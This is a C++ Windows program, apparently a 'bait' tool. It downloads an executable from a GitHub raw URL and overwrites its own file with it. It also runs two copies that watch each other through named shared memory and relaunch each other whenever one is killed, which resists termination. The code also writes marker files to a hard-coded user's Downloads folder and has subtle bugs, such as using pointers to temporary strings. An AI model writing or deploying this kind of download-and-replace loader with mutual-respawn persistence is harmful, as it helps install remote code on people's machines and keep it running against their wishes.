#include <windows.h>
#include <shlwapi.h>
#include <wininet.h>
#include <iostream>
#include <string>

const int version=0;

bool fetchUrlToFile(const char* url, const char* outputFilePath) {
    HINTERNET hInternet, hURL;
    HANDLE hFile;
    DWORD bytesWritten;

    // Initialize WinINet
    hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) {
        return false;
    }

    // Open the URL
    hURL = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hURL == NULL) {
        InternetCloseHandle(hInternet);
        return false;
    }

    // Create the output file
    hFile = CreateFileA(outputFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        InternetCloseHandle(hURL);
        InternetCloseHandle(hInternet);
        return false;
    }

    // Read the response data and write it to the file
    const DWORD bufferSize = 4096;
    char* buffer = new char[bufferSize];
    DWORD bytesRead;
    do {
        if (!InternetReadFile(hURL, buffer, bufferSize, &bytesRead)) {
            delete[] buffer;
            CloseHandle(hFile);
            InternetCloseHandle(hURL);
            InternetCloseHandle(hInternet);
            return false;
        }
        if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL)) {
            delete[] buffer;
            CloseHandle(hFile);
            InternetCloseHandle(hURL);
            InternetCloseHandle(hInternet);
            return false;
        }
    } while (0 < bytesRead);

    // Clean up
    delete[] buffer;
    CloseHandle(hFile);
    InternetCloseHandle(hURL);
    InternetCloseHandle(hInternet);

    return true;
}

std::string fetchUrl(const char* url) {
    std::string response;
    HINTERNET hInternet, hURL;

    // Initialize WinINet
    hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInternet == NULL) {
        //Failed to initialize WinINet
        return "";
    }

    // Open the URL
    hURL = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hURL == NULL) {
        //Failed to open URL
        InternetCloseHandle(hInternet);
        return "";
    }

    // Read the response data
    const DWORD bufferSize = 4096;
    char buffer[bufferSize];
    DWORD bytesRead;
    do {
        if (!InternetReadFile(hURL, buffer, bufferSize - 1, &bytesRead)) {
            //Failed to read from URL
            InternetCloseHandle(hURL);
            InternetCloseHandle(hInternet);
            return "";
        }
        buffer[bytesRead] = '\0';
        response.append(buffer);
    } while (0 < bytesRead);

    // Clean up
    InternetCloseHandle(hURL);
    InternetCloseHandle(hInternet);

    return response;
}

int main(int argc, char* argv[])
{
    char path[MAX_PATH]="";
    GetModuleFileNameA(NULL, path, MAX_PATH);

    int me;
    if(argc<2){
        me=0;
    }else if(std::string(argv[1])=="update"){
        HANDLE file = CreateFile("C:/Users/tt/Downloads/start", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL);
        CloseHandle(file);

        const char* a=fetchUrl("https://raw.githubusercontent.com/tankhellfire/remote/main/bait/version").c_str();
        if(version<std::stoi(a)){
            //a=fetchUrl("https://raw.githubusercontent.com/tankhellfire/remote/main/bait/.exe").c_str();
            MoveFileExA(path, (std::string(path)+"uyjhgbg").c_str(), MOVEFILE_REPLACE_EXISTING);
            fetchUrlToFile("https://raw.githubusercontent.com/tankhellfire/remote/main/bait/.exe",path);
            return 0;
        }

        file = CreateFile("C:/Users/tt/Downloads/m.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL);
        WriteFile(file, a, strlen(a), NULL, NULL);
        CloseHandle(file);
        return 0;
    }else{
        HANDLE file = CreateFile("C:/Users/tt/Downloads/stoi", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL);
        WriteFile(file, argv[1], strlen(argv[1]), NULL, NULL);
        CloseHandle(file);
        me=std::stoi(argv[1]);
    }
    HANDLE shm_handle  = CreateFileMappingW(INVALID_HANDLE_VALUE,NULL,PAGE_READWRITE,0,8,L"JrRKULBcTr");
    void* shm_ptr = MapViewOfFile(shm_handle,FILE_MAP_ALL_ACCESS,0,0,8);

    uint32_t* myMem = reinterpret_cast<uint32_t*>(static_cast<uint8_t*>(shm_ptr) + (me*4));
    uint32_t* theirMem = reinterpret_cast<uint32_t*>(static_cast<uint8_t*>(shm_ptr) + (((me+1)%2)*4));

    //HANDLE file = CreateFile(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    char* meStr=const_cast<char*>((std::string(path)+std::string(" ")+std::to_string((me+1)%2)).c_str());
    uint32_t lastMyMem = 0;
    //while(GetTickCount()-(static_cast<uint32_t>(*myMem))<2000){
    while(true){
        lastMyMem = GetTickCount();
        *static_cast<uint32_t*>(myMem) = lastMyMem;
        if(100<(GetTickCount()-(static_cast<uint32_t>(*theirMem)))){

            STARTUPINFO startupInfo;
            PROCESS_INFORMATION processInfo;
            ZeroMemory(&startupInfo, sizeof(startupInfo));
            startupInfo.cb = sizeof(startupInfo);

            //WriteFile(file, meStr, strlen(meStr), NULL, NULL);
            CreateProcessA(NULL, meStr, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo);
        }
        Sleep(50);
        if((lastMyMem!=static_cast<uint32_t>(*myMem))&&(lastMyMem!=0)){
            return 0;
        }
    };
}